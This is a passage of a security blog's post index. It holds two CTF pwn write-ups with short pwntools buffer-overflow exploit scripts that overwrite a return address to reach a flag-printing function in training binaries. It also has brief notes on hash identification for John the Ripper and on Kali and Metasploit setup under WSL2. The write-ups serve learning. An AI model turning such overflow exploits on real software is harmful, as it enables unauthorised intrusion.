main<br>0x004005a0    1 6            sym.imp.setvbuf<br>0x00400528    3 23           sym._init<br>[0x004005b0]&gt;<br></code></pre></td></tr></table></figure><ol start="3"><li><p><code>s main</code>, <code>VV</code> to see what main function do. it seems nothing special in main function but call the function pwnme and print some strings. So we go to see what happends in the function pwnme.<br><img src="https://i.imgur.com/jiYjxOg.png" alt="Image"></p></li><li><p><code>s sym.pwnme</code>, <code>VV</code>. In this function, we found the input will be put at <strong>var_20h(rbp-0x20)</strong>.</p></li></ol><p><img src="https://i.imgur.com/p38FkK4.png" alt="Image"></p><p><img src="https://i.imgur.com/9WEcrRi.png" alt="Image"></p><ol start="5"><li>let’s look at another function ret2win. <code>s sym.ret2win</code>, <code>VV</code>. we saw it will print the flag we want, so we know that our mission is to BOF the pwnme function’s stack and put the address of ret2win function to the return address of pwnme’s stack frame.</li></ol><p><img src="https://i.imgur.com/R3cHeB1.png" alt="Image"></p><ol start="6"><li>write the exploit script bellow.</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>r = process(<span class="hljs-string">&#x27;./ret2win&#x27;</span>)<br><span class="hljs-comment">#r = remote(&#x27;120.114.62.211&#x27;, 6126)</span><br><br>payload = <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">40</span><br><br>r.sendline(payload + p64(<span class="hljs-number">0x00400756</span>))  <span class="hljs-comment">#if 64 bit ,or 32bit use p32</span><br><br>r.interactive()<br></code></pre></td></tr></table></figure><ol start="7"><li>run the script and we can get the flag.</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs zsh">$ python3 exploit_ret2win.py<br>[+] Starting local process &#x27;./ret2win&#x27;: pid 715<br>[*] Switching to interactive mode<br>ret2win by ROP Emporium<br>x86_64<br><br>For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!<br>What could possibly go wrong?<br>You there, may I have your input please? And don&#x27;t worry about null bytes, we&#x27;re using read()!<br><br>&gt; Thank you!<br>Well done! Here&#x27;s your flag:<br>ROPE&#123;a_placeholder_32byte_flag!&#125;<br>[*] Got EOF while reading in interactive<br>$<br></code></pre></td></tr></table></figure><p>the flag is：ROPE{a_placeholder_32byte_flag!}</p>]]></content>
    
    
    <categories>
      
      <category>Writeup</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CyberSecurity</tag>
      
      <tag>PWN</tag>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Writeup-gohome</title>
    <link href="/2021/11/01/Writeup-gohome/"/>
    <url>/2021/11/01/Writeup-gohome/</url>
    
    <content type="html"><![CDATA[<ol><li>use <code>file &lt;file&gt;</code> to take a look. It’s a ELF file, not stripped.<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ file gohome<br>gohome: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked,<br>interpreter /lib64/ld-linux-x86-64.so.2, <span class="hljs-keyword">for</span> GNU/Linux 2.6.32, <br>BuildID[sha1]=63cc39d0f4f93acc2ee50813f4f82c8ed43d9135, not stripped<br></code></pre></td></tr></table></figure></li></ol><p>2.use <code>gdb-peda checksec</code> to make sure whether it have protection of the program. by the result, we know that only NX protection is open.<br><img src="https://i.imgur.com/YsoMUcS.png" alt="Image"> </p><ol start="3"><li><p><code>r2 &lt;file&gt;</code>, <code>aa</code>, <code>afl</code>, there’s some function we can pay attention to.<br><img src="https://i.imgur.com/EFXiT2J.png" alt="Image"></p></li><li><p>first, <code>s main</code>, <code>VV</code> to take a look.<br><img src="https://i.imgur.com/9eNQ6Rq.png" alt="Image"></p></li><li><p>by the code, we know that the program will exit after gets function get our user input. And our input will be put at <strong>var_20h(rpb-0x20)</strong>. Let’s go back to see Billyhouse function.</p></li></ol><p><img src="https://i.imgur.com/RISfNKD.png" alt="Image"></p><ol start="6"><li><p>we notice that this program will print flag which we want to get. So, what we need to do is to let the program jump here to run this function.</p></li><li><p>count to overwrite the stack and rbp address until the return address. we need to BOF all of them, put the Billyhouse function address to the return address. Bellow is our exploit script.</p></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>r = process(<span class="hljs-string">&#x27;./gohome&#x27;</span>)<br><span class="hljs-comment">#r = remote(&#x27;120.114.62.211&#x27;, 6126)</span><br><br>payload = <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">40</span><br><br>r.sendline(payload + p64(<span class="hljs-number">0x004006c6</span>))  <span class="hljs-comment">#if 64 bit ,or 32bit use p32</span><br><br>r.interactive()<br></code></pre></td></tr></table></figure><ol start="8"><li>run the program and we can get the flag.</li></ol>]]></content>
    
    
    <categories>
      
      <category>Writeup</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CyberSecurity</tag>
      
      <tag>PWN</tag>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>John The Ripper</title>
    <link href="/2021/08/06/John-The-Ripper/"/>
    <url>/2021/08/06/John-The-Ripper/</url>
    
    <content type="html"><![CDATA[<h1 id="基本步驟："><a href="#基本步驟：" class="headerlink" title="基本步驟："></a>基本步驟：</h1><ol><li>如果要破解hash的話，要先判斷是哪種hash<br> a. 可以利用網路資源-<a href="https://hashes.com/en/tools/hash_identifier">Hashes.com</a><br> b. 或是使用python工具-<a href="https://pypi.org/project/hashID/">hashid</a><blockquote><p>hashid.py 使用方式<br> 可直接 <code>python3 hash-id.py</code>輸入<br> 也可以 <code>cat hash.txt | hash-identifier</code> 這種方式輸入</p></blockquote><p> c. 也可以自己用比對(<code>Ctrl-f</code>)的方式：<br> <a href="https://hashcat.net/wiki/doku.php?id=example_hashes" title="hashcat.net">hash表</a></p></li></ol>]]></content>
    
    
    <categories>
      
      <category>Learning Note</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CyberSecurity</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>WSL2-Kali 使用 msf 資料庫的錯誤解決</title>
    <link href="/2021/07/02/WSL2-Kali-%E4%BD%BF%E7%94%A8-msf-%E8%B3%87%E6%96%99%E5%BA%AB%E7%9A%84%E9%8C%AF%E8%AA%A4%E8%A7%A3%E6%B1%BA/"/>
    <url>/2021/07/02/WSL2-Kali-%E4%BD%BF%E7%94%A8-msf-%E8%B3%87%E6%96%99%E5%BA%AB%E7%9A%84%E9%8C%AF%E8%AA%A4%E8%A7%A3%E6%B1%BA/</url>
    
    <content type="html"><![CDATA[<p>參考<a href="https://xunmi.blog.csdn.net/article/details/108809948?utm_medium=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~default-14.control&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~default-14.control" title="CSDN">這位的博客</a></p><p>第一次設置完之後，以後要用之前需先啟用該資料庫：<code>sudo service postgresql start</code></p><p>可以看一下狀態：<code>sudo service postgresql status</code></p><p>然後再進<code>msfconsole</code></p><p>連接你的資料庫：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">db_connect 資料庫用戶名:資料庫密碼@資料庫ip[:資料庫port]/資料庫名<br><br><span class="hljs-comment"># e.g. db_connect xiung:root@127.0.0.1/msf</span><br></code></pre></td></tr></table></figure><p><img src="/./../img/20210702.jpeg"></p>]]></content>
    
    
    <categories>
      
      <category>Environment stuff</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WSL</tag>
      
      <tag>database</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>WSL2安裝kali 記錄</title>
    <link href="/2021/07/01/WSL2%E5%AE%89%E8%A3%9Dkali-%E8%A8%98%E9%8C%84/"/>
    <url>/2021/07/01/WSL2%E5%AE%89%E8%A3%9Dkali-%E8%A8%98%E9%8C%84/</url>
    
    <content type="html"><![CDATA[<p>從安裝到GUI設置、rdp，可參考這位NetworkChuck大大的<a href="https://www.youtube.com/watch?v=AfVH54edAHU&t=221s">影片</a>，一步一步帶你做到好。</p><p>文字教學可參考kali的<a href="https://www.kali.org/docs/wsl/win-kex/">官方網站</a>，裡面還有包含一個win-kex的圖形介面(的樣子，我沒有用所以不太清楚)。</p><p>用過之後會發現這個kali不是完整版的，有很多工具都沒有安裝，所以可以額外安裝一下工具包，上網查了一下有發現幾種包，如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><br><span class="hljs-comment">#完整版(個人是用這個)</span><br>sudo apt install -y kali-linux-large <br><br><span class="hljs-comment">#核心版</span><br>sudo apt install -y kali-linux-default<br><br><span class="hljs-comment">#完完整版(?</span><br>sudo apt install -y kali-linux-everything<br></code></pre></td></tr></table></figure><p>補充<a href="https://www.kali.org/blog/major-metapackage-makeover/">官網說法</a>:</p><p><img src="/./../img/20210701_1.png"></p><p><img src="/./../img/20210701_2.png"></p><p>開啟遠端連線指令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 開啟遠端程式</span><br>sudo service xrdp start<br><br><span class="hljs-comment"># 查詢ip</span><br>ip addr<br></code></pre></td></tr></table></figure><p>然後，紀錄一下以後可能會用到的其他參考資料:</p><p><a href="https://zhuanlan.zhihu.com/p/263658960">WSL2優化</a></p><p>WSL2解除安裝:</p><p><a href="https://www.itread01.com/p/1383209.html">Win10 linux子系統解除安裝方法</a></p><p><a href="https://pureinfotech.com/uninstall-wsl2-windows-10/">How to uninstall WSL2 on Windows 10 * Pureinfotech</a></p><p><a href="https://blog.csdn.net/qq_39611230/article/details/108675915">中文化(?</a></p>]]></content>
    
    
    <categories>
      
      <category>Environment stuff</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WSL</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
